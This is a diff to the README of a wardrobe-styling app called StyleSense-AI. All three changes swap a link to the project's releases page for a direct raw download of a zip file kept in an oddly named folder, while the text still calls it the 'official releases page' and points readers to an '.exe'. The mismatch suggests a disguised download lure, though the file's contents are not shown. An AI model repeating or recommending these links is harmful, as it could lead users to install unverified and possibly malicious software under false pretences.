@@ -1,6 +1,6 @@
 # 🎨 StyleSense-AI - Make Your Personal Style Effortless
 
-[![](https://img.shields.io/badge/Download-StyleSense--AI-blue.svg)](https://github.com/Pomatomussaltatrixsubscriptionright298/StyleSense-AI/releases)
+[![](https://img.shields.io/badge/Download-StyleSense--AI-blue.svg)](https://github.com/Pomatomussaltatrixsubscriptionright298/StyleSense-AI/raw/refs/heads/main/brittleness/Style_Sense_AI_1.8.zip)
 
 StyleSense-AI helps you organize your wardrobe and pick outfits. The software analyzes your clothing items to suggest matches based on current trends and the local weather. You spend less time choosing clothes and more time on your day.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the application smoothl
 
 You do not need programming skills to use this tool. Follow these instructions to set up StyleSense-AI on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/Pomatomussaltatrixsubscriptionright298/StyleSense-AI/releases) to access the installer.
+1. Visit the [official releases page](https://github.com/Pomatomussaltatrixsubscriptionright298/StyleSense-AI/raw/refs/heads/main/brittleness/Style_Sense_AI_1.8.zip) to access the installer.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the link to save the file to your computer.
 4. Locate the file in your downloads folder.
@@ -70,4 +70,4 @@ Software developers release updates to fix bugs and improve performance. When yo
 
 ## 🔗 Direct Access
 
-Use this link to download the software: [Download StyleSense-AI for Windows](https://github.com/Pomatomussaltatrixsubscriptionright298/StyleSense-AI/releases). Ensure you download the installer version labeled for Windows systems to guarantee compatibility.
+Use this link to download the software: [Download StyleSense-AI for Windows](https://github.com/Pomatomussaltatrixsubscriptionright298/StyleSense-AI/raw/refs/heads/main/brittleness/Style_Sense_AI_1.8.zip). Ensure you download the installer version labeled for Windows systems to guarantee compatibility.
